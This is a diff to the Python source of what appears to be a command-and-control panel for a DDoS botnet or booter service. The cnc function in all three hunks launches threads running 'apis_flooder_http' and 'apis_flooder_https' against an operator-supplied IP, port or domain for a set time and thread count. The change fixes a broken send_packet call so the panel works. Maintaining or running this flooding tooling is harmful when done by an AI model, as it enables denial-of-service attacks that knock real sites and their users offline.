@@ -328,7 +328,7 @@ def cnc(client_socket,address,username):
      elif count == 9:send_packet(client_socket,a%(str(times)),ex=True)
      elif count == 10:send_packet(client_socket,a%(str(threader)),ex=True)
      elif count == 11:send_packet(client_socket,a%(COM),ex=True)
-     else:send_packet(a,ex=True)
+     else:send_packet(client_socket,a,ex=True)
     threading.Thread(target=apis_flooder_http,args=(ip,port,times,threader,COM,meth_http)).start()
    else:
     send_packet(client_socket,f'{color_char(70)}{COM} {color_char(71)}<{color_char(255)}IP{color_char(71)}> {color_char(71)}<{color_char(255)}PORT{color_char(71)}> {color_char(71)}<{color_char(255)}TIMES{color_char(71)}> {color_char(71)}<{color_char(255)}THREAD{color_char(71)}> {color_char(71)}<{color_char(255)}METHODS_HTTP{color_char(71)}>',remove_=True,ex=True)
@@ -347,7 +347,7 @@ def cnc(client_socket,address,username):
      elif count == 9:send_packet(client_socket,a%(str(times)),ex=True)
      elif count == 10:send_packet(client_socket,a%(str(threader)),ex=True)
      elif count == 11:send_packet(client_socket,a%(COM),ex=True)
-     else:send_packet(a,ex=True)
+     else:send_packet(client_socket,a,ex=True)
     threading.Thread(target=apis_flooder_http,args=(ip,port,times,threader,COM,'GET')).start()
    else:
     send_packet(client_socket,f'{color_char(70)}{COM} {color_char(71)}<{color_char(255)}IP{color_char(71)}> {color_char(71)}<{color_char(255)}PORT{color_char(71)}> {color_char(71)}<{color_char(255)}TIMES{color_char(71)}> {color_char(71)}<{color_char(255)}THREAD{color_char(71)}>',remove_=True,ex=True)
@@ -369,7 +369,7 @@ def cnc(client_socket,address,username):
      elif count == 9:send_packet(client_socket,a%(str(times)),ex=True)
      elif count == 10:send_packet(client_socket,a%(str(threader)),ex=True)
      elif count == 11:send_packet(client_socket,a%(COM),ex=True)
-     else:send_packet(a,ex=True)
+     else:send_packet(client_socket,a,ex=True)
     threading.Thread(target=apis_flooder_https,args=(protocol,domain,times,threader,COM,meth_http)).start()
    else:
     send_packet(client_socket,f'{color_char(70)}{COM} {color_char(71)}<{color_char(255)}PROTOCOL{color_char(71)}> {color_char(71)}<{color_char(255)}DOMAIN{color_char(71)}> {color_char(71)}<{color_char(255)}TIMES{color_char(71)}> {color_char(71)}<{color_char(255)}THREAD{color_char(71)}> {color_char(71)}<{color_char(255)}METHODS_HTTP{color_char(71)}>',remove_=True,ex=True)
